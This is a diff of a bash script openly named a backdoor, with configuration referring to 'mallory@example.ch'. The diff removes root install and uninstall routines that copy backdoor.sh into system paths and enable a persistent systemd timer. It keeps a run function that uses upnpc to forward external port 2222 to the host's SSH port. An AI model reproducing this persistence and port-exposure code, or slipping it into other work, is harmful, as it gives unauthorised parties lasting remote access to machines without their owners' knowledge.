@@ -12,50 +12,8 @@
 #--------------------------BACKDOOR CONFIGURATION:-----------------------------------------------
 backdoor=~/.backdoor # default -> root, change "User" in backdoor.service
 emailaddress='mallory@example.ch'
-#sshservice='ssh.service' # archlinux -> sshd.service or sshd.socket, ubuntu -> ssh.service
-
-
-
-#-------------------------------INSTALL FUNCTIONS:---------------------------------------------
-function install # for installing the backdoor
-{
-[[ $EUID -ne 0 ]] && echo 'please run this script as root to install/uninstall.' && exit
-echo 'installing...'
-# Move files
-sed -i -r "s/ssh.*/$sshservice/" backdoor.timer
-cp backdoor.sh /usr/local/bin/
-chmod +x /usr/local/bin/backdoor.sh
-cp backdoor.service backdoor.timer /etc/systemd/system/ 
-# Enable services
-systemctl enable --now backdoor.timer
-# Check
-systemctl status $sshservice postfix backdoor.timer
-systemctl list-timers
-clear
-echo 'done installing!'
-exit
-}
-function uninstall # for removing the backdoor
-{
-[[ $EUID -ne 0 ]] && echo 'please run this script as root to install/uninstall.' && exit
-echo 'uninstalling...'
-# Disable services
-systemctl disable --now backdoor.timer
-# Remove files
-rm /home/$(sed -r -n 's/^User=//p' /etc/systemd/system/backdoor.service)/.backdoor
-rm /etc/systemd/system/backdoor* $backdoor /usr/local/bin/backdoor.sh
-# Check
-systemctl status $sshservice postfix backdoor.timer
-systemctl list-timers
-clear
-echo 'done uninstalling! remember to check everything!'
-exit
-}
-
-
 
 #-----------------------------MAIN FUNCTIONS:------------------------------------------------
-
 function getdata # Gather Statistics
 {
 # GET DATA
@@ -98,10 +56,6 @@ function run
     upnpc -a $ip_private 22 2222 TCP
 }
 
-
-
 #------------------------------MAIN SCRIPT:-------------------------------------------
-[[ $# -ne 1 ]] && echo -e "NO ACTION SELECTED! usage: $0 [install|uninstall|run]" && exit
-[[ $1 == 'install' || $1 == 'uninstall' || $1 == 'run' ]] && $1
+[[ $# -eq 1 ]] && [[ $1 == 'run' ]] && $1
 exit
-
